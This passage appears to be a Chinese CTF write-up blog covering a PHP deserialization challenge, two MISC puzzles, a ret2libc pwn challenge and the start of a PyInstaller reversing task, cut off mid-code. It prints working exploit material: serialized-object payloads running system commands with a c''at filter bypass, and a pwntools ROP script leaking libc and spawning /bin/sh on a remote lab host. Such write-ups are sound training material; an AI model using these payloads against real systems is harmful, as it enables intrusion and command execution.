punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            @<span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>@<span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'unser'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token delimiter important\">?></span></pre></td></tr></table></figure><p>先构造查看根目录的反序列化 php：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">evil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> <span class=\"token keyword\">private</span> <span class=\"token variable\">$cmd</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"ls la /\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/cat|tac|more|tail|base/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> @<span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">evil</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token delimiter important\">?></span></pre></td></tr></table></figure><p>结果如下所示：</p>\n<p><img data-src=\"image-20231010191929591.png\" alt=\"image-20231010191929591\"></p>\n<p>发现我们想要的 flag，再构造反序列化，由于 cat 被过滤了，直接使用 cat 会在构造后的语句中含有 cat，所以使用 <code>c''at</code>  重新构造，获得该 flag：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">evil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> <span class=\"token keyword\">private</span> <span class=\"token variable\">$cmd</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"c''at /th1s_1s_fffflllll4444aaaggggg\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/cat|tac|more|tail|base/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> @<span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">evil</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token delimiter important\">?></span></pre></td></tr></table></figure><p><img data-src=\"image-20231010192329198.png\" alt=\"image-20231010192329198\"></p>\n<p><code>flag&#123;7626fe20-384c-4362-acd8-3f74fdf9b6e9&#125;</code></p>\n<h2 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> MISC</h2>\n<h3 id=\"新建word文档\"><a class=\"markdownIt-Anchor\" href=\"#新建word文档\">#</a> 新建 Word 文档</h3>\n<p>打开题目，其中包含一个 word 文档，打开之后发现一片空白，这时候，我们找到 word 选项，显示这里，将隐藏文字打开，就可以看到一堆不明所以的话：</p>\n<pre><code>新佛曰：毘諸隸僧降吽諸陀摩隸僧缽薩願毘耨咤陀願羅咤喃修願宣亦宣寂叻寂阿是吽阿塞尊劫毘般毘所聞降毘咒塞尊薩咒毘所若降般斯毘嚴毘嚴波斯迦毘色毘波嚴毘喃念若修嘚般毘我毘如毘如囑囑\n</code></pre>\n<p>查了一下，是一种密码，打开<span class=\"exturl\" data-url=\"aHR0cDovL2hpLnBjbW9lLm5ldC9idWRkaGEuaHRtbA==\">在线网站</span>揭秘如下：</p>\n<p><img data-src=\"image-20231009155007685.png\" alt=\"image-20231009155007685\"></p>\n<p><code>flag&#123;Th1s_F0_1s_s00_Cyp3r_495586e3df3a&#125;</code></p>\n<h3 id=\"永不消逝的电波\"><a class=\"markdownIt-Anchor\" href=\"#永不消逝的电波\">#</a> 永不消逝的电波</h3>\n<p>题目是一段音频，停了一下，感觉是摩尔斯电码，手动打出来如下：</p>\n<pre><code>..-. .-.. .- --. - .... . -... . ... - -.-. - ..-. . .-. .. ... -.-- --- ..- \n</code></pre>\n<p>再用翻译器翻一下：</p>\n<pre><code>FLAGTHEBESTCTFERISYOU\n</code></pre>\n<p><code>flag&#123;thebestctferisyou&#125;</code></p>\n<h2 id=\"pwn\"><a class=\"markdownIt-Anchor\" href=\"#pwn\">#</a> PWN</h2>\n<h3 id=\"ret2libc\"><a class=\"markdownIt-Anchor\" href=\"#ret2libc\">#</a> ret2libc</h3>\n<p>首先查看安全检查：</p>\n<p><img data-src=\"image-20231010194410389.png\" alt=\"image-20231010194410389\"></p>\n<p>使用 IDA 查看代码：</p>\n<p><img data-src=\"image-20231012092339639.png\" alt=\"image-20231012092339639\"></p>\n<p>发现有栈溢出，但是没有任何的漏洞函数，但是有 libc 函数，和 puts 函数，说明该题是需要我们自己利用 libc 中的 system 函数进行渗透。在 linux 延迟绑定机制中，当程序调用库函数时，会将 libc.so 文件中的函数地址写到程序的 got 表中，调用时会跳转到 got 表所写的地址。那么我们如果要调用 system 函数，就要知道他的 got 表中的地址，got 表中的地址指的就是当系统将 libc（动态链接库）加载到内存中时，库中的函数的地址。但 libc 被加载到的内存的位置是随机的，我们无从得知。但是，同一版本的 libc 的两个库函数在 libc 中的相对位置是不变的，所以如果我们可以知道一个已经执行过的函数的 got 表地址，然后确定 libc 的版本，就可以加上和 system 函数的偏移，从而得到 system 函数的真实地址，即 got 表地址。碰巧的是，我们拥有一个 puts 函数，我们可以用 puts 函数，将一个已经执行过的函数的 got 表地址打印出来，然后再根据地址获取 libc 版本，确定偏移，得到真实地址；并且，在 libc 中，存在着 system 函数和 /bin/sh 字符串，所以我们只需要考虑如何得到一个执行过的函数的真实地址即可，并不需要考虑如何写入 /bin/sh 字符串。本题可以利用 puts 函数打印自身的 got 表。</p>\n<p><img data-src=\"image-20231012093039549.png\" alt=\"image-20231012093039549\"></p>\n<p>64 位程序的参数从左到右依次放入寄存器: rdi, rsi, rdx, rcx, r8, r9 中。我们使用的 puts 函数只需要传入一个参数，所以只需要一个寄存器 rdi 即可。通过 <code>ROPgadge</code>  查找我们能够利用的语句地址：</p>\n<p><img data-src=\"image-20231010214546832.png\" alt=\"image-20231010214546832\"></p>\n<p>我们采用  <code>0x400763 </code>  的语句，先在本地进行尝试：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># context.terminal = ['tmux','splitw','-h']   #需要装分屏工具</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>sh <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'ret2libc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'ret2libc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>puts_plt <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>puts_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>start_address <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>rdi_address <span class=\"token operator\">=</span> <span class=\"token number\">0x400763</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">32</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi_address<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>start_address<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sh<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Show me your magic again\"</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>puts_address <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[*]leak puts addr: \"</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>puts_address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>可以成功得到 puts 本地的地址：</p>\n<pre><code>leak puts addr: 0x?????????\n</code></pre>\n<p>再添加如下语句得到本地 libc 库中的 system 和 /bin/sh 的地址：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>base_address <span class=\"token operator\">=</span> puts_address <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>system_address <span class=\"token operator\">=</span> base_address <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>binsh_address <span class=\"token operator\">=</span> base_address <span class=\"token operator\">+</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>最后通过如下代码进行构建获取 shell，这里如果不添加 ret_addr 的话就会导致栈不对齐，程序会直接终止运行，加入一个无关紧要的返回语句进行对齐：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ret_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x400506</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>payload2 <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">32</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>ret_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi_address<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>binsh_address<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>system_address<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>sh<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Show me your magic again\"</span><span class=\"token punctuation\">,</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>sh<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>这个时候我们已经可以在本地成功的获取到 shell 了，现在进行靶机的攻入：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># context.terminal = ['tmux','splitw','-h']   #需要装分屏工具</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>sh <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28845</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># sh = process('ret2libc')</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'ret2libc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>puts_plt <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>puts_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>start_address <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>rdi_address <span class=\"token operator\">=</span> <span class=\"token number\">0x400763</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">32</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi_address<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>start_address<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>sh<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Show me your magic again\"</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>puts_address <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[*]leak puts addr: \"</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>puts_address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>第一次进行传入可以查看到靶机的 libc.puts 函数的真实地址：</p>\n<pre><code>leak puts addr: 0x7f4254048970\n</code></pre>\n<p>利用其地址的最后三位 970 在网站上查询远程所使用的 libc 库版本：</p>\n<p><img data-src=\"image-20231012140630752.png\" alt=\"image-20231012140630752\"></p>\n<p>可以发现找到了四个符合的 libc 版本，其中每个函数的 offset 已经标出，在程序中进行替换即可。经过多次测试，发现第三个库版本是我们需要的库版本。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>base_address <span class=\"token operator\">=</span> puts_address <span class=\"token operator\">-</span> <span class=\"token number\">0x080970</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>system_address <span class=\"token operator\">=</span> base_address <span class=\"token operator\">+</span> <span class=\"token number\">0x04f420</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>binsh_address <span class=\"token operator\">=</span> base_address <span class=\"token operator\">+</span> <span class=\"token number\">0x1b3d88</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>ret_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x400506</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>payload2 <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">32</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>ret_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi_address<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>binsh_address<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>system_address<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>sh<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Show me your magic again\"</span><span class=\"token punctuation\">,</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># sh.sendline(payload2)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>sh<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>最终的运行结果如下所示：</p>\n<p><img data-src=\"image-20231011200839136.png\" alt=\"image-20231011200839136\"></p>\n<p><code>flag&#123;f5d55c23-cdfd-4170-9cb8-db66ac3ed237&#125;</code></p>\n<h2 id=\"re\"><a class=\"markdownIt-Anchor\" href=\"#re\">#</a> RE</h2>\n<h3 id=\"pzthon\"><a class=\"markdownIt-Anchor\" href=\"#pzthon\">#</a> PZthon</h3>\n<p>使用 DIE 进行扫描可以发现，该文件没有加壳，但是该程序是使用 PyInstaller 进行打包的，于是我们需要使用 python 的解包工具。</p>\n<p><img data-src=\"image-20231012151805680.png\" alt=\"image-20231012151805680\"></p>\n<p>我们使用以下代码下载一个 exe 解包工具，在同一目录下使用。</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">git</span> clone https://github.com/extremecoders-re/pyinstxtractor.git</pre></td></tr></table></figure><pre><code>python .\\pyinstxtractor.py .\\PZthon.exe\n</code></pre>\n<p><img data-src=\"image-20231012155024222.png\" alt=\"image-20231012155024222\"></p>\n<p>magic number 是在 pyc 文件开头的一段表示 python 版本的数，解包出来的 pyc 文件很可能会 magic number 缺失，需要手动补全。解包完成后，我们需要保证 magic number 的一致，比较 PZthon.pyc 和 struct.pyc 的前几位，发现没有 magic number，不需要补充。</p>\n<p>接下来下载如下工具，进行反编译为 py：</p>\n<pre><code>https://github.com/cw2k/pycdc_withExe/releases/tag/1%2C0\n</code></pre>\n<p>使用如下代码，将 PZthon 代码反编译为 py</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>.<span class=\"token punctuation\">\\</span>pycdc.exe .<span class=\"token punctuation\">\\</span>PZthon.pyc <span class=\"token operator\">></span> .<span class=\"token punctuation\">\\</span>PZthon.py</pre></td></tr></table></figure><p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1QWnRob24tb2kybHMzdC5weQ==\">打开 PZthon.py</span>，得到如下内容：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># Source Generated with Decompyle++</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># File: PZthon.pyc (Python 3.9)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">hello</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    art <span class=\"token operator\">=</span> <span class=\"token string\">'\\n              ___                                                                      \\n    //   ) )     / /    //   ) )  // | |     / /        // | |  \\\\ / / \\\\    / /       \\n   //___/ /     / /    //        //__| |    / /        //__| |   \\\\  /   \\\\  / /        \\n  / ____ /     / /    //  ____  / ___  |   / /        / ___  |   / /     \\\\/ /         \\n //           / /    //    / / //    | |  / /        //    | |  / /\\\\     / /          \\n//           / /___ ((____/ / //     | | / /____/ / //     | | / /  \\\\   / /           \\n                                                                                       \\n     / /        //   / / ||   / / //   / /  / /       /__  ___/ ||   / |  / / //   ) ) \\n    / /        //____    ||  / / //____    / /          / /     ||  /  | / / //   / /  \\n   / /        / ____     || / / / ____    / /          / /      || / /||/ / //   / /   \\n  / /        //          ||/ / //        / /          / /       ||/ / |  / //   / /    \\n / /____/ / //____/ /    |  / //____/ / / /____/ /   / /        |  /  | / ((___/ /     \\n'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>art<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Please give me the flag: '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>enc <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token number\">115</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token number\">121</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token number\">116</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token number\">114</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token number\">110</span><span class=\"token 